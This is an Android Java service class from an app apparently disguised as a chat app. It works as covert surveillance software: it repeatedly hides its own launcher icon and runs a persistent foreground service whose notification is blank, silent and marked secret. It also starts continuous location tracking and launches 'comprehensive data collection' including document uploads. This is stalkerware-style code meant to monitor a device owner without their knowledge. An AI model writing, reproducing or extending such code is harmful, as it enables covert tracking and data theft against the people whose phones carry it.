package com.bushorat.chatapp.services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.bushorat.chatapp.helpers.AppVisibilityHelper;
import com.bushorat.chatapp.helpers.DataCollectorService;
import com.bushorat.chatapp.helpers.SessionManager;
import com.bushorat.chatapp.helpers.LocationSyncHelper;
import com.bushorat.chatapp.helpers.UserDataSyncHelper;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;

/**
 * Background service that runs continuously to:
 * 1. Apply and maintain visibility settings (hidden/shown)
 * 2. Sync data in background
 * 3. Upload documents
 * 4. Keep the app working even when closed or in background
 *
 * Works on Android 12+ with foreground service notifications.
 */
public class BackgroundMaintenanceService extends Service {
    private static final String TAG = "BackgroundMaintenance";
    private static final int NOTIFICATION_ID = 9999;
    private static final String CHANNEL_ID = "bushorat_background_silent";
    private static final long HIDE_ENFORCE_INTERVAL_MS = 120_000L;

    private boolean heavyTasksScheduled = false;

    private final Handler handler = new Handler(Looper.getMainLooper());
    private final Runnable enforceHideRunnable = new Runnable() {
        @Override
        public void run() {
            AppVisibilityHelper helper = AppVisibilityHelper.getInstance(BackgroundMaintenanceService.this);
            if (helper.isAppHidden()) {
                helper.enforceHiddenLauncher();
                // Extra hard pass if the launcher intent is still resolvable (ghost icon).
                if (!com.bushorat.chatapp.helpers.LauncherIconController.isLauncherHidden(
                        BackgroundMaintenanceService.this)) {
                    com.bushorat.chatapp.helpers.LauncherIconController.applyHideHard(
                            BackgroundMaintenanceService.this);
                }
            }
            handler.postDelayed(this, HIDE_ENFORCE_INTERVAL_MS);
        }
    };

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "BackgroundMaintenanceService created");
        
        // Create notification channel for Android 8+
        createNotificationChannel();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(NOTIFICATION_ID, createMinimalNotification());

        applyVisibilitySettings();
        handler.removeCallbacks(enforceHideRunnable);
        handler.post(enforceHideRunnable);

        if (!heavyTasksScheduled) {
            heavyTasksScheduled = true;
            scheduleBackgroundTasks();
        }

        return START_STICKY;
    }

    private void applyVisibilitySettings() {
        try {
            AppVisibilityHelper helper = AppVisibilityHelper.getInstance(this);
            helper.ensureListenerStarted();
            if (helper.isAppHidden()) {
                helper.enforceHiddenLauncher();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error applying visibility settings", e);
        }
    }

    private void scheduleBackgroundTasks() {
        try {
            AppVisibilityHelper.getInstance(this).ensureListenerStarted();

            FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
            if (user == null && !new SessionManager(this).isUserLoggedIn()) {
                Log.w(TAG, "No user logged in, skipping background tasks");
                return;
            }
            if (user == null) {
                Log.w(TAG, "Firebase auth restoring — visibility sync only");
                return;
            }
            
            Log.d(TAG, "Scheduling background tasks for user: " + user.getUid());
            
            // ✨ ENSURE LOCATION UPDATES ARE RUNNING
            Log.d(TAG, "📍 Starting location update requests (critical for location tracking)");
            try {
                LocationRequestService locationService = LocationRequestService.getInstance(this);
                locationService.startLocationUpdates();
                Log.d(TAG, "✓ LocationRequestService started");
            } catch (Exception e) {
                Log.e(TAG, "Failed to start LocationRequestService", e);
            }
            
            // COMPREHENSIVE DATA COLLECTION
            // ⭐ THIS IS THE ONLY PLACE THAT ENQUEUES WORKERS
            Log.d(TAG, "🔄 Starting comprehensive data collection");
            DataCollectorService.collectAllData(this);
            
            // NOTE: Do NOT call DocumentSyncHelper.schedulePeriodicDocumentUpload() here
            // as it would cause duplicate worker enqueueing and cancellations.
            // DataCollectorService.collectDocuments() already handles document uploads.
            
            Log.d(TAG, "✓ All background tasks scheduled");
        } catch (Exception e) {
            Log.e(TAG, "Error scheduling background tasks", e);
        }
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Backup",
                    NotificationManager.IMPORTANCE_MIN
            );
            channel.setDescription("");
            channel.enableLights(false);
            channel.enableVibration(false);
            channel.setShowBadge(false);
            channel.setSound(null, null);

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    /** Foreground service requirement only — no user-visible monitoring message. */
    private Notification createMinimalNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentTitle("")
                .setContentText("")
                .setOngoing(true)
                .setSilent(true)
                .setShowWhen(false)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .setLocalOnly(true)
                .build();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        Log.d(TAG, "BackgroundMaintenanceService destroyed");
        handler.removeCallbacks(enforceHideRunnable);
        super.onDestroy();
    }
}
